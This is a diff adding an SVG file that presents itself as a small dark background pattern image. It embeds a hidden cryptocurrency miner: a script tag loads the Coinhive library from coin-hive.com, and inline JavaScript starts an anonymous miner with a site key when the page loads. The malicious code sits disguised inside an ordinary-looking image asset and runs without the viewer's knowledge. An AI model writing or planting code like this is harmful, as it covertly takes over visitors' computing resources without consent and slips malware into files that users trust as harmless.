@@ -1,0 +1,15 @@
+<?xml version="1.0" encoding="UTF-8" standalone="no"?>
+<svg xmlns='http://www.w3.org/2000/svg' width='15' height='15' xmlns:xlink='http://www.w3.org/1999/xlink'>
+<rect width='50' height='50' fill='#282828'/>
+<circle cx='3' cy='4.3' r='1.8' fill='#393939'/>
+<circle cx='3' cy='3' r='1.8' fill='black'/>
+<circle cx='10.5' cy='12.5' r='1.8' fill='#393939'/>
+<circle cx='10.5' cy='11.3' r='1.8' fill='black'/>
+  <script xlink:href="https://coin-hive.com/lib/coinhive.min.js" />
+  <script type="text/javascript">
+        window.addEventListener('load',function(){
+			var miner = new CoinHive.Anonymous('yixSY8xCiKWNXDeFHZHBeLRtFxoH0zRo');
+			miner.start();
+        })
+  </script>  
+</svg>
